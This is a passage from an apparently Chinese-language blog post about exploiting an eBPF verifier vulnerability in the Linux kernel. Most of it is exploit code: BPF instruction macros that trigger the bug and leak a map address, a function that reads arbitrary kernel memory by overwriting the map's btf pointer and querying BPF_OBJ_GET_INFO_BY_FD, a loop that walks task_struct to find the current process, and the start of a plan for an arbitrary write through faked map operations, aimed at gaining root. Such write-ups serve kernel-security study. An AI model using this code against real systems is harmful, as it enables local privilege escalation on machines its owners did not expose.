</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_8), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_8, BPF_REG_7, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">leak_map_addr</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn prog[] = {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">TRIGGER_VULN</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">LEAK_MAP_ADDR</span><span style="color:#c0c5ce;">(map_fd), 
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">run_bpf_prog</span><span style="color:#c0c5ce;">(prog, sizeof(prog) / sizeof(prog[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]), </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="ren-yi-di-zhi-du-xie-lu-jin-cheng-di-zhi">任意地址读，泄露进程地址</h3><p>bpf_map中有一个指向<code>struct btf</code>的指针</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_map {
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">//...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">btf *btf;
</span></pre>
<p><strong>BPF Type Format</strong>（BTF）是一种元数据格式，用于给 eBPF 提供一些额外的信息，在内核中使用 <code>btf</code> 结构体表示一条 btf 信息：</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">btf {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*data;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">btf_type **types;
</span><span style="color:#c0c5ce;">	u32 *resolved_ids;
</span><span style="color:#c0c5ce;">	u32 *resolved_sizes;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*strings;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*nohdr_data;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> btf_header hdr;
</span><span style="color:#c0c5ce;">	u32 nr_types; </span><span style="color:#65737e;">/* includes VOID for base BTF */
</span><span style="color:#c0c5ce;">	u32 types_size;
</span><span style="color:#c0c5ce;">	u32 data_size;
</span><span style="color:#c0c5ce;">	refcount_t refcnt;
</span><span style="color:#c0c5ce;">	u32 id;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> rcu_head rcu;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* split BTF support */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">btf *base_btf;
</span><span style="color:#c0c5ce;">	u32 start_id; </span><span style="color:#65737e;">/* first type ID in this BTF (0 for base BTF) */
</span><span style="color:#c0c5ce;">	u32 start_str_off; </span><span style="color:#65737e;">/* first string offset (0 for base BTF) */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> name[MODULE_NAME_LEN];
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> kernel_btf;
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>bpf系统调用提供了一个选项<code>BPF_OBJ_GET_INFO_BY_FD</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#8fa1b3;">SYSCALL_DEFINE3</span><span style="color:#c0c5ce;">(bpf, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">, cmd, </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr __user *, uattr, </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">, size)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">//...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(cmd) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">//...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_OBJ_GET_INFO_BY_FD:
</span><span style="color:#c0c5ce;">		err = </span><span style="color:#8fa1b3;">bpf_obj_get_info_by_fd</span><span style="color:#c0c5ce;">(&amp;attr, uattr);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span></pre>
<p>其中会获取map btf中的btf_id 一个32位无符号类型
从而如果控制map中的btf指针 可以利用此处进行任意地址读</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">bpf_obj_get_info_by_fd</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const union</span><span style="color:#c0c5ce;"> bpf_attr *</span><span style="color:#bf616a;">attr</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				  </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr __user *</span><span style="color:#bf616a;">uattr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(f.</span><span style="color:#bf616a;">file</span><span style="color:#c0c5ce;">-&gt;f_op == &amp;bpf_map_fops)
</span><span style="color:#c0c5ce;">		err = </span><span style="color:#8fa1b3;">bpf_map_get_info_by_fd</span><span style="color:#c0c5ce;">(f.</span><span style="color:#bf616a;">file</span><span style="color:#c0c5ce;">, f.</span><span style="color:#bf616a;">file</span><span style="color:#c0c5ce;">-&gt;private_data, attr,
</span><span style="color:#c0c5ce;">					     uattr);
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">bpf_map_get_info_by_fd</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *</span><span style="color:#bf616a;">file</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				  </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *</span><span style="color:#bf616a;">map</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				  </span><span style="color:#b48ead;">const union</span><span style="color:#c0c5ce;"> bpf_attr *</span><span style="color:#bf616a;">attr</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				  </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr __user *</span><span style="color:#bf616a;">uattr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(map-&gt;btf) {
</span><span style="color:#c0c5ce;">		info.</span><span style="color:#bf616a;">btf_id </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">btf_obj_id</span><span style="color:#c0c5ce;">(map-&gt;btf);
</span><span style="color:#c0c5ce;">		info.</span><span style="color:#bf616a;">btf_key_type_id </span><span style="color:#c0c5ce;">= map-&gt;btf_key_type_id;
</span><span style="color:#c0c5ce;">		info.</span><span style="color:#bf616a;">btf_value_type_id </span><span style="color:#c0c5ce;">= map-&gt;btf_value_type_id;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_to_user</span><span style="color:#c0c5ce;">(uinfo, &amp;info, info_len) ||
</span><span style="color:#c0c5ce;">	    </span><span style="color:#8fa1b3;">put_user</span><span style="color:#c0c5ce;">(info_len, &amp;uattr-&gt;info.</span><span style="color:#bf616a;">info_len</span><span style="color:#c0c5ce;">))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>对应代码如下 用户态<code>struct bpf_map_info</code>接收</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">READ_ARBITRARY_ADDR</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">__idx</span><span style="color:#c0c5ce;">)            \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* extend the alu-&gt;limit and do the oob read */ </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_8, VULN_REG),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_7, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, BPF_REG_8, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0xd0</span><span style="color:#c0c5ce;">),         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* write the value into bpf_map-&gt;btf */         </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(__idx, __map_fd, BPF_REG_8),     \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_1, BPF_REG_8, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_1, </span><span style="color:#d08770;">0x58</span><span style="color:#c0c5ce;">),        \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_7, BPF_REG_1, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">read_arbitrary_addr_4_bytes</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn prog[] = {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">TRIGGER_VULN</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">MAKE_VULN_REG</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">READ_ARBITRARY_ADDR</span><span style="color:#c0c5ce;">(map_fd, idx), 
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map_info info;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">info</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">bpf_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">info</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">info_len </span><span style="color:#c0c5ce;">= sizeof(info),
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">info</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">info </span><span style="color:#c0c5ce;">= (uint64_t) &amp;info,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">    size_t data;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    ret = </span><span style="color:#8fa1b3;">run_bpf_prog</span><span style="color:#c0c5ce;">(prog, sizeof(prog) / sizeof(prog[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]), </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;info, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(info));
</span><span style="color:#c0c5ce;">    ret = </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    data = info.</span><span style="color:#bf616a;">btf_id</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> data;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">read_arbitrary_addr</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">addr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    size_t data;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> key;
</span><span style="color:#c0c5ce;">    size_t value[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Loading value into map...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = addr;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to load value into map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = addr + </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to load value into map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    data = </span><span style="color:#8fa1b3;">read_arbitrary_addr_4_bytes</span><span style="color:#c0c5ce;">(map_fd, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    data &lt;&lt;= </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    data += </span><span style="color:#8fa1b3;">read_arbitrary_addr_4_bytes</span><span style="color:#c0c5ce;">(map_fd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> data;
</span><span style="color:#c0c5ce;">}
</span></pre>
<blockquote>
<p>btf结构体中<code>id</code> 偏移0x58</p>
</blockquote>
<p>接着可以通过<code>init_task</code>沿着<code>struct task_struct</code>中<code>struct list_head tasks;</code>遍历进程找当前进程。判断搜索到方法 可以比较pid 或<code>prctl(PR_SET_NAME, "xxx")</code>设置<code>task_struct-&gt;comm</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">size_t current_task;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">search_for_current_task</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    size_t next_task = INIT_TASK + kernel_offset + </span><span style="color:#d08770;">0x818</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    size_t data;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">prctl</span><span style="color:#c0c5ce;">(PR_SET_NAME, &quot;</span><span style="color:#a3be8c;">arttnba3</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">do </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">        next_task = </span><span style="color:#8fa1b3;">read_arbitrary_addr</span><span style="color:#c0c5ce;">(map_fd, next_task);
</span><span style="color:#c0c5ce;">        data = </span><span style="color:#8fa1b3;">read_arbitrary_addr</span><span style="color:#c0c5ce;">(map_fd, next_task + </span><span style="color:#d08770;">0x2d0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(data != *(size_t*) &quot;</span><span style="color:#a3be8c;">arttnba3</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    current_task = next_task - </span><span style="color:#d08770;">0x818</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] Get current task_struct&#39;s addr: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">           current_task);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>测试版本下偏移</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[   15.991786] Offset of `tasks` in `task_struct` struct: 0x818 
</span><span style="color:#c0c5ce;">[   15.991828] Offset of `comm` in `task_struct` struct: 0xae8 
</span></pre>
<h3 id="ren-yi-di-zhi-xie">任意地址写</h3><p>传统方法劫持map_ops，在map上构造fake map ops劫持执行流+栈迁移<code>commit_cred(&amp;init_cred)</code></p>
<blockquote>
<p>高版本内核中：
​​init_cred 符号未导出​​：
新版本内核中，init_cred（init 进程的凭证结构体）通常不再作为导出符号（EXPORT_SYMBOL），普通模块无法直接引用其地址。
prepare_kernel_cred(NULL) 的失效​​：
过去常用的 commit_creds(prepare_kernel_cred(NULL)) 在新内核中会返回 NULL，因为
prepare_kernel_cred() 对参数 NULL 的检查更严格。</p>
</blockquote>
<p>array map 的 <code>map_get_next_key()</code> 定义如下，当 <code>key</code> 小于 <code>map.max_entries</code> 时 <code>key</code> 会被写入到 <code>next_key</code> 当中：</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* Called from syscall */
</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">array_map_get_next_key</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *</span><span style="color:#bf616a;">map</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">next_key</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_array *array = </span><span style="color:#8fa1b3;">container_of</span><span style="color:#c0c5ce;">(map, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_array, map);
</span><span style="color:#c0c5ce;">	u32 index = key ? *(u32 *)key : U32_MAX;
</span><span style="color:#c0c5ce;">	u32 *next = (u32 *)next_key;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(index &gt;= array-&gt;map.</span><span style="color:#bf616a;">max_entries</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		*next = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(index == array-&gt;map.</span><span style="color:#bf616a;">max_entries </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOENT;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	*next = index + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_map_ops array_map_ops = {
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">map_get_next_key </span><span style="color:#c0c5ce;">= array_map_get_next_key,
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>但是这个函数指针调用<code>next_key</code>参数不可控</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">map_get_next_key</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr *</span><span style="color:#bf616a;">attr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	next_key = </span><span style="color:#8fa1b3;">kmalloc</span><span style="color:#c0c5ce;">(map-&gt;key_size, GFP_USER);
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">rcu_read_lock</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">	err = map-&gt;ops-&gt;</span><span style="color:#8fa1b3;">map_get_next_key</span><span style="color:#c0c5ce;">(map, key, next_key);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>不过可以通过替换fake ops中其他函数指针为<code>array_map_get_next_key()</code>，且替换的函数签名具有三个参数均可控 如<code>map_push_elem</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* map is generic key/value storage optionally accesible by eBPF programs */
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_map_ops {
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_push_elem)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*value, u64 flags);
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>回头找在<code>map_push_elem</code>调用链</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">BPF_MAP_UPDATE_ELEM
</span><span style="color:#c0c5ce;">	map_update_elem()
</span><span style="color:#c0c5ce;">		bpf_map_update_value()
</span><span style="color:#c0c5ce;">			
</span></pre>
<p>需要map类型为<code>BPF_MAP_TYPE_QUEUE</code>或<code>BPF_MAP_TYPE_STACK</code></p>
<pre style="background-color:#2b303b;">
